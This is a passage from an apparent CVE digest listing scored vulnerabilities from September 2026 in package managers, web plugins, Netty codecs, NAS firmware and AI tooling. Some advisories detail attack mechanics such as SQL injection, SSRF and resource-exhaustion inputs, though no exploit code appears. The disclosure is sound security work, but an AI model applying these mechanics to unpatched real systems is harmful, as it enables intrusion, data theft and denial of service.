| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-345;CWE-347` |
| Published | 2026-09-17T17:16:43.290 |

mport is the MidnightBSD Package Manager. Prior to 2.7.8, the mport_fetch_bootstrap_index() function in libmport/fetch.c could return success when bootstrap index hash verification encountered a missing or invalid hash because the failure path did not preserve a fatal result. A network attacker or compromised mirror able to alter bootstrap index content or its transport path could therefore cause mport to proceed with an unverified or tampered bootstrap package index. This issue is fixed in version 2.7.8.

### CVE-2026-54580

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-354;CWE-755` |
| Published | 2026-09-17T17:16:43.150 |

mport is the MidnightBSD Package Manager. Prior to 2.7.8, libmport/util.c did not make every truncated, corrupt, or failed zstd stream fatal in mport_decompress_zstd(), and libmport/fetch.c did not consistently propagate those failures to index-fetch callers. A malicious or faulty mirror could supply compressed package index data that caused ZSTD_decompressStream() or an output write to fail while leaving partial index output available for later use, resulting in package-index integrity loss or denial of service. This issue is fixed in version 2.7.8.

### CVE-2026-83946

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T00:17:44.960 |

Improper neutralization of input during web page generation ('cross-site scripting') in Azure Portal allows an unauthorized attacker to perform spoofing over a network.

### CVE-2026-54354

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T21:17:15.260 |

MapServer is a system for developing web-based GIS applications. Prior to 8.6.4, MapServer's PostGIS runtime filter translation in src/mappostgis.cpp and msPostGISLayerTranslateFilter() treats a filteritem as numeric when CONNECTIONTYPE POSTGIS and metadata such as gml_<item>_type=Integer are configured, but it does not verify that attacker-controlled CGI qstring or OGC API Features featureId input is a numeric literal. The unquoted input is concatenated into the generated PostgreSQL/PostGIS predicate, allowing an unauthenticated remote attacker with access to an affected query endpoint to bypass predicates, enumerate unintended records, perform boolean-based or time-based SQL injection, and increase database load. The issue does not by itself establish database modification capabilities. This issue is fixed in version 8.6.4.

### CVE-2026-54451

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-674` |
| Published | 2026-09-17T19:16:50.360 |

Elixir protobuf is a pure Elixir implementation of Google Protobuf. From 0.8.0 until 0.16.1, services that decode attacker-controlled protobuf bytes with Protobuf.Decoder can be taken offline when the schema contains a self-referential or cyclic message type. In lib/protobuf/decoder.ex, Protobuf.Decoder.value_for_field/3 handles an embedded?: true field by recursively entering the decode / build_message / handle_value / value_for_field call chain without enforcing a nesting-depth limit. Deeply nested embedded fields retain non-tail recursive frames, allowing a comparatively small request to consume substantial CPU and memory, pin a BEAM scheduler, and exhaust the node. This issue is fixed in version 0.16.1.

### CVE-2026-54253

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-17T19:16:50.203 |

TS3 Manager is modern web interface for maintaining Teamspeak3 servers. Prior to 2.2.6, the /api/download handler in packages/server/routes/api.js passes the attacker-controlled port query parameter to socket.connect(port, host) and returns the resulting error.message through res.status(400).send(error.message) as text/html without a Content Security Policy. When a logged-in operator follows a crafted top-level link, the reflected value executes in the manager origin. The token cookie set in packages/ui/src/store/modules/query.js lacks HttpOnly, Secure, and an explicit SameSite attribute, allowing the script to read the token and call the autofillform event in packages/server/socket.js. autofillform returns the decoded JWT, including the cleartext ServerQuery password, enabling operator-session hijacking and control of the managed TeamSpeak server when the operator uses administrative ServerQuery credentials. A valid operator session and user interaction are required. This issue is fixed in 2.2.6.

### CVE-2026-86039

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-290;CWE-345` |
| Published | 2026-09-17T16:18:17.090 |

libp2p is a JavaScript implementation of the libp2p networking stack. From 8.0.0 until 12.0.24, @libp2p/peer-store in packages/peer-store/src/index.ts uses consumePeerRecord to verify a RecordEnvelope signature but does not require PeerRecord.peerId in the signed payload to equal the signer peer ID derived by RecordEnvelope.openAndCertify. The expectedPeer option checks only the envelope signer, and the gossipsub Peer Exchange path can provide the attacker's own peer ID as expectedPeer. An attacker can therefore sign a record with the attacker's key, place a victim peer ID and attacker-controlled multiaddrs in the payload, and have certified addresses stored for the victim. The poisoned addresses can cause address-book corruption, dial redirection or failure, routing manipulation, and reachability disruption, although the connection upgrade still verifies remote peer identity and prevents a complete identity takeover. The issue is fixed in version 12.0.24.

### CVE-2026-56795

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-427` |
| Published | 2026-09-17T16:17:31.893 |

Dell Server Update Utility, versions prior to 26.07.01, contains an Uncontrolled Search Path Element vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to Code execution.

### CVE-2026-85077

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N` |
| Weaknesses | `CWE-113` |
| Published | 2026-09-17T15:16:54.990 |

Sanic is an opensource python web server/framework. Prior to version 24.12.1, and in version 25.12.0, the HTTP/1.1 response pipeline in sanic/response/types.py serializes response header names and values without rejecting carriage-return or line-feed characters. Applications that place attacker-controlled data in response.headers, file(..., filename=...), or cookie path and domain attributes can therefore emit injected headers and may split responses. Depending on application and proxy behavior, this can enable session fixation through injected cookies, cache poisoning, or security-header corruption. This issue is fixed in versions 24.12.1 and 25.12.1.

### CVE-2026-85410

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-18T09:16:42.500 |

The Master Addons for Elementor – Elementor Addons, Widgets, Mega Menu Builder, Popup Builder, Widget Builder & Template Kits plugin for WordPress is vulnerable to authorization bypass in all versions up to, and including, 3.2.2. This is due to the plugin not properly verifying that a user is authorized to perform an action. This makes it possible for authenticated attackers, with contributor-level access and above, to modify the title and metadata of arbitrary WordPress posts or permanently delete arbitrary WordPress posts by supplying an attacker-controlled popup_id. The required nonce is emitted on the edit-jltma_popup admin screen, which is accessible to Contributors because the jltma_popup custom post type is registered with capability_type='post'.

### CVE-2026-6205

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-73` |
| Published | 2026-09-18T09:16:42.133 |

An external control of file name or path vulnerability in Upload API in Synology DiskStation Manager (DSM) before 7.2.1-69057-12, 7.2.2-72806-9, 7.3.2-86009-4 and 7.4-90075 allows remote authenticated users to write arbitrary files and conduct denial-of-service attacks.

### CVE-2026-67102

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-285` |
| Published | 2026-09-18T08:17:00.857 |

HCL BigFix Service Management is affected by a high-severity Broken Access Control vulnerability, which could allow a low-privileged user to gain unauthorized access to administrative screens and functions reserved for higher-privileged roles.

### CVE-2026-89413

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-18T07:16:51.337 |

The Filter Gallery plugin for WordPress is vulnerable to authorization bypass in all versions up to, and including, 1.1.4. This is due to the plugin not properly verifying that a user is authorized to perform an action. This makes it possible for authenticated attackers, with subscriber-level access and above, to delete any arbitrary Filter Gallery records — including all associated filters, image mappings, settings, and details options — by supplying attacker-controlled gallery IDs. The nonce bypass requires omitting the nonce POST field entirely rather than submitting an invalid value, as a present-but-invalid nonce is correctly rejected.

### CVE-2026-54520

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-17T22:17:01.090 |

AI Agent Automation is a modular AI agent workflow automation platform with schedulers, tools, and observability. Prior to 0.9.1, the executeStep file-step implementation in backend/src/agents/executor.js passes the user-controlled step.path value through path.resolve with process.cwd() and then uses the resulting path for read or write operations without checking that it remains in an approved workflow directory. An authenticated user who can create or modify workflow file steps can supply traversal segments to escape the intended workspace and read sensitive files or write and overwrite files accessible to the backend process, including application-adjacent files when process permissions allow. This issue is fixed in version 0.9.1.

### CVE-2026-93375

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-706` |
| Published | 2026-09-17T21:17:54.787 |

Incorrect reference resolution in Tracing in Google Chrome on on Windows prior to 153.0.8010.52 allowed a local attacker to potentially execute arbitrary code outside the sandbox via a local program. (Chromium security severity: High)

### CVE-2026-54596

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T21:17:16.683 |

ITFlow provides an IT documentation, ticketing and accounting system for small managed service providers. Prior to version 26.07, an authenticated Technician or higher with access to at least one client invoice can inject SQL through the frequency parameter handled by agent/post/recurring_invoice.php. The handler passes recurring_invoice_frequency through sanitizeInput but interpolates it unquoted into DATE_ADD, allowing SQL syntax to escape the interval expression, assign additional INSERT columns, store subquery results in recurring_invoice_note, and expose those results through agent/recurring_invoice.php. The persisted recurring_invoice_frequency can execute again when Force Recurring uses it in a later UPDATE, allowing another legitimate user to trigger the second-order injection. This can expose password hashes, SMTP credentials, user records, and database metadata, modify database fields, and enable administrative takeover after credential cracking. This issue is fixed in version 26.07.

### CVE-2026-54446

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-17T18:16:46.040 |

NetLicensing MCP Server is a natural-language interface that enables agentic applications to manage the software-licensing lifecycle in Labs64 NetLicensing. Prior to 0.1.6, network-reachable HTTP transport requests to /mcp that omit x-netlicensing-api-key, Authorization: Bearer, and the apikey query parameter pass through ApiKeyMiddleware in src/netlicensing_mcp/server.py without authentication. The downstream api_key_ctx in src/netlicensing_mcp/client.py then falls back to the operator's NETLICENSING_API_KEY and authenticates upstream NetLicensing REST API calls under the operator account. An unauthenticated attacker can invoke MCP tools to enumerate products, licenses, licensees, and transactions, create or modify licensing objects, perform validations, and execute destructive delete operations. The issue affects HTTP deployments configured with a server-side key and does not require user interaction. This issue is fixed in version 0.1.6.

### CVE-2026-26950

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-345` |
| Published | 2026-09-17T15:16:46.763 |

Dell SmartFabric Manager, versions prior to 2.2.1, contains an Insufficient Verification of Data Authenticity vulnerability. A low privileged attacker with remote access could potentially exploit this vulnerability, leading to Elevation of privileges.

### CVE-2026-40530

| 項目 | 値 |
|------|-----|
| CVSS | `8.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-93` |
| Published | 2026-09-18T09:16:40.237 |

An improper neutralization of CRLF sequences ('CRLF injection') vulnerability in User API in Synology DiskStation Manager (DSM) before 7.2.1-69057-10, 7.2.2-72806-7 and 7.3.2-86009-2 allows remote authenticated users to read or write arbitrary files and conduct denial-of-service attacks after the system is rebooted.

### CVE-2026-87886

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-276` |
| Published | 2026-09-17T23:18:53.763 |

Local privilege escalation due to insecure file permissions. The following products are affected: Acronis Backup plugin for cPanel & WHM (Linux) before build 1.9.3.1021, Acronis Backup extension for Plesk (Linux) before build 1.8.11.638, Acronis Backup plugin for DirectAdmin (Linux) before build 1.2.3.238.

### CVE-2026-54692

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-131;CWE-787` |
| Published | 2026-09-17T20:16:52.550 |

SAIL is a cross-platform library for loading and saving images with support for animation, metadata, and ICC profiles. Prior to 1.0.0, sail_codec_load_frame_v8_xbm() in src/sail-codecs/xbm/xbm.c allocates the decoded pixel buffer using the X11 one-byte-per-literal layout, but an X10 static short file causes the flat decode loop to write two file-controlled bytes per literal. When ceil(width/8) produces an odd row stride, the X10 literal count includes a padding byte for every row, but the destination has no space for those bytes, so loading the XBM through sail_load_from_file, sail_load_from_memory, or sail_start_loading_* produces a forward heap overwrite that scales with image height. The X11 static char path is not affected. The overwrite can corrupt process state, cause reliable crashes, and potentially enable code execution in a susceptible consuming application. This issue is fixed in version 1.0.0.

### CVE-2026-18912

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T06:16:33.250 |

ManageEngine DataSecurity Plus versions before 6310 are vulnerable to an authenticated SQL injection vulnerability, allowing an authenticated technician to execute arbitrary SQL queries through the Reports module.

### CVE-2026-85887

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-732` |
| Published | 2026-09-18T00:17:47.920 |

Incorrect permission assignment for critical resource in M365 Copilot allows an authorized attacker to disclose information over a network.

### CVE-2026-53557

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-17T22:17:00.243 |

SQLBot is an intelligent Text-to-SQL system based on large language models and RAG. Prior to 1.9.0, an authenticated user can supply a crafted sheet["tableName"] value in the Excel datasource configuration submitted through POST /api/v1/datasource/, and SQLBot stores that value without safe identifier handling. When the same datasource is later removed through DELETE /api/v1/datasource/{id}, the stored value is interpolated into datasource cleanup SQL and executed by PostgreSQL. This second-order SQL injection can invoke PostgreSQL COPY TO PROGRAM and execute arbitrary operating-system commands with the privileges of the postgres process inside the SQLBot container. This issue is fixed in version 1.9.0.

### CVE-2026-50158

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` |
| Weaknesses | `CWE-73` |
| Published | 2026-09-17T22:16:59.297 |

yutu is an AI-powered toolkit for managing and growing YouTube channels. Prior to 0.10.9, the caption-download MCP tool accepts a caller-controlled file parameter through cmd/caption/download.go and passes it to Caption.Download() in pkg/caption/caption.go, where os.Create() creates or truncates that path without using the pkg.Root confinement boundary backed by YUTU_ROOT. A principal able to invoke caption-download, including a local HTTP client when the MCP server runs with its default authentication-disabled configuration, can write downloaded caption bytes to any path writable by the yutu process outside YUTU_ROOT. This can overwrite application files, configuration, shell startup files, logs, or data and can cause persistent code execution or denial of service depending on the selected writable target. Live caption retrieval also requires usable service credentials and an accessible caption identifier. This issue is fixed in version 0.10.9.

### CVE-2026-54339

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-09-17T21:17:15.123 |

Glean is a self-hosted RSS reader and personal knowledge management tool. Prior to 0.2.6, POST /api/feeds/discover passes an attacker-supplied feed_url to discover_feed(feed_url), creates a subscription through FeedService.create_subscription(), and enqueues fetch_feed_task. The background path calls fetch_feed(feed.url) and parse_feed(), which assigns each RSS item link to ParsedEntry.url. The task then passes ParsedEntry.url to fetch_and_extract_fulltext(parsed_entry.url) without network-level validation in backend/packages/rss/glean_rss/extractor.py and backend/apps/worker/glean_worker/tasks/feed_fetcher.py. A malicious feed can therefore make the server request private, loopback, link-local, or cloud-metadata resources. The fetched response is stored in Entry.content and can be retrieved through GET /api/entries/{id}, producing non-blind server-side request forgery with full response disclosure. This can bypass network perimeters, probe internal services and ports, expose internal configuration or web content, and potentially disclose cloud metadata access tokens. This issue is fixed in version 0.2.6.

### CVE-2026-48977

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-123;CWE-823;CWE-1284` |
| Published | 2026-09-17T21:17:13.323 |

OpenSlide is a C library for reading whole slide image files. From 3.4.1 until 4.0.1, OpenSlide's parse_level0_xml() processing in src/openslide-vendor-ventana.c accepts nonpositive row or column tile counts from a crafted Ventana BIF file. The invalid counts produce attacker-controlled relative memory offsets and allow arbitrary values to be written at those offsets, affecting all supported platforms and configurations and resulting in a crash or potential arbitrary code execution. This issue is fixed in version 4.0.1.

### CVE-2026-67103

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-18T08:17:00.977 |

HCL BigFix Service Management is affected by Cross-Site Scripting (XSS) vulnerability, which could allow an attacker to inject unsanitized malicious scripts that execute in a victim's browser, enabling session hijacking, account takeover, and unauthorized actions on behalf of affected users.

### CVE-2026-54506

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-79;CWE-116;CWE-185` |
| Published | 2026-09-17T22:17:00.537 |

Vvveb is a powerful and easy to use CMS with page builder to build websites, blogs or ecommerce stores. Prior to 1.0.8.5, app/controller/user/profile.php accepts the user[bio] field and passes stored content through sanitizeHTML() in system/functions.php, whose on* event-handler regular expression omits the forward-slash delimiter and whose do-while condition compares the string to itself, so forbidden nested tags are removed only once. An Author-role or higher user can submit solidus-prefixed event-handler markup or nested forbidden tags that survive sanitization. The stored bio is rendered without sufficient output encoding on /author/{username}, in the admin user-management view, and potentially in comment displays, causing attacker-controlled JavaScript to execute when unauthenticated visitors, administrators, or other users view the content. This can expose browser-session data and permit victim-context account actions, defacement, or phishing. This issue is fixed in version 1.0.8.5.

### CVE-2026-45726

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:3.1/AV:A/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-200;CWE-522;CWE-732` |
| Published | 2026-09-17T20:16:49.650 |

Omni manages Kubernetes on bare metal, virtual machines, or in a cloud. From 1.3.0 until 1.6.6 and 1.7.3, importing a standalone Talos cluster creates an ImportedClusterSecrets resource containing the cluster's complete CA secrets bundle. The access rules in internal/backend/runtime/omni/state_access.go allow an authenticated user with the Reader role to retrieve the resource through ResourceService if the importing actor has not rotated those secrets, exposing Kubernetes, Talos, and etcd CA private keys plus the service-account key. The Kubernetes CA private key permits certificate signing for privileged identities such as system:masters and provides control of the imported cluster outside Omni's authorization boundary, including its workloads, credentials, and secrets. This issue is fixed in versions 1.6.6 and 1.7.3.

### CVE-2026-93560

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1035` |
| Published | 2026-09-18T14:19:08.210 |

STOMP codec content-length long-to-int truncation causes infinite decode loop DoS

### CVE-2026-93491

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-18T13:18:38.723 |

A flaw was found in Netty's HttpServerCodec. A remote, unauthenticated attacker can exploit this vulnerability by pipelining HTTP/1.1 requests on a single connection and withholding reads. This action causes the methodOverflowQueue to grow without limit, leading to unbounded heap memory consumption and a denial of service due to memory exhaustion.

### CVE-2026-93488

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-18T12:17:30.667 |

A flaw was found in Netty. SpdySessionHandler accepts an unlimited number of concurrent remote-initiated streams because localConcurrentStreams defaults to Integer.MAX_VALUE and the handler provides no API to change it. A remote peer can open a SPDY connection and send a large number of SYN_STREAM frames with FLAG_FIN=0, causing unbounded heap and direct memory allocation that can lead to JVM OutOfMemoryError and a denial of service.

### CVE-2026-93575

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1035` |
| Published | 2026-09-18T11:17:22.033 |

### Summary
Netty's fix for CVE-2026-44248 is incomplete. The decoder checks if the MQTT packet's `Remaining Length` exceeds `maxBytesInMessage`, but fails to validate the `Properties Length` against the `Remaining Length`. An attacker can bypass the size limit by sending a small `Remaining Length` but an enormous `Properties Length`. This forces Netty to buffer and parse millions of properties, allowing an unauthenticated remote attacker to trigger excessive memory and CPU consumption, leading to OutOfMemoryError.

### Details
In `io.netty.handler.codec.mqtt.MqttDecoder`, the `decodeProperties()` helper method reads `totalPropertiesLength` and attempts to parse that many bytes. If the buffer lacks the full length, a `Signal` is thrown. The `catch` block inside `decode()` only enforces `maxBytesInMessage` against `bytesRemainingBeforeVariableHeader` (the packet's `Remaining Length`).

By sending a `CONNECT` packet with a small `Remaining Length` but a huge `Properties Length`, the size check passes. `ReplayingDecoder` then buffers data from the network until the huge `Properties Length` is reached, parsing millions of `UserProperty` objects and exhausting CPU and memory.

#

### CVE-2026-93572

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770` |
| Published | 2026-09-18T11:17:21.900 |

## Summary

`RedisArrayAggregator` recently added `maxElements` and `maxNestedArrayDepth` limits to fix public Redis resource-exhaustion advisories. The limits are independent, but the allocator remains eager: every positive nested RESP array header creates `new ArrayList<RedisMessage>(length)` before any child element exists.

With the default constructor, an attacker can send nested array headers with length `1,000,000` until the default nesting limit of `1024` is reached. This can reserve up to `1,024,000,000` child slots from roughly 12 KB of RESP input. This is backing capacity, not logical list size: `ArrayList(int)` constructs an empty list with the specified initial capacity.

## Technical Details

Current `decodeRedisArrayHeader(...)` checks the two limits independently:

```java
if (header.length() > maxElements) {
    throw new CodecException("this codec doesn't support longer length than " + maxElements);
}

if (depths.size() >= maxNestedArrayDepth) {
    releaseAndClearDepths();
    throw new CodecException("max nested array depth exceeded: "  + maxNestedArrayDepth);
}
depths.push(new AggregateState((int) header.length()));
```

`AggregateState` i

### CVE-2026-93563

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1035` |
| Published | 2026-09-18T11:17:21.773 |

Unbounded multi-line response accumulation in SmtpResponseDecoder leads to memory-exhaustion DoS

### CVE-2026-87743

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-551` |
| Published | 2026-09-18T10:17:07.520 |

A flaw was found in Quarkus HTTP security. An unauthenticated attacker can exploit a discrepancy in how paths are normalized between the security matcher and HTTP request dispatchers. This allows the attacker to craft a URL that the security matcher considers public, but which is then routed to a protected endpoint, leading to an authorization bypass and potential unauthorized access to sensitive information.

### CVE-2026-93494

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1035` |
| Published | 2026-09-18T08:17:02.647 |

A flaw was found in Netty's StompSubframeDecoder component. A remote attacker can exploit this vulnerability by sending a specially crafted STOMP frame body without its terminating null byte. This causes the decoder to allocate a ByteBuf (a buffer for bytes) that is never released, leading to a permanent memory leak. Over time, this uncontrolled memory consumption can result in a Denial of Service (DoS) for the application using the affected STOMP codec.

### CVE-2026-89059

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-409` |
| Published | 2026-09-18T08:17:01.783 |

A flaw was found in RESTEasy's IIOImageProvider, which decodes attacker-supplied image request bodies without enforcing any limit on the declared image dimensions or pixel count. A remote, unauthenticated attacker can send a small crafted image declaring enormous dimensions to trigger a very large memory allocation, exhausting the JVM heap and resulting in a denial of service.

### CVE-2026-85705

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T08:17:01.520 |

The Location Manager plugin for WordPress is vulnerable to generic SQL Injection via 'latitude' and 'longitude' REST API Parameters in all versions up to, and including, 2.3.38 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. The injection is triggered when the orderby=lat_lon parameter is supplied, and affects multiple publicly accessible REST endpoints including geodir/v2/locations/cities, /regions, /countries, and /neighbourhoods via both the get_locations() and get_neighbourhoods() functions.

### CVE-2026-18442

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T08:17:00.443 |

The WCFM Marketplace – Multivendor Marketplace for WooCommerce plugin for WordPress is vulnerable to generic SQL Injection via the 'wcfmmp_user_location_lng' parameter in all versions up to, and including, 3.8.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

### CVE-2026-15275

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-18T08:16:59.870 |

The WP Multi Store Locator Pro plugin for WordPress is vulnerable to generic SQL Injection via the 'store_locatore_search_radius' parameter in all versions up to, and including, 4.5.1 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. The injection occurs in a numeric, unquoted SQL context, meaning WordPress's wp_magic_quotes() addslashes-based protection cannot neutralize the payload, and the AJAX handler is registered on wp_ajax_nopriv_make_search_request with no nonce or capability check, making it fully accessible without authentication.

### CVE-2026-14323

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
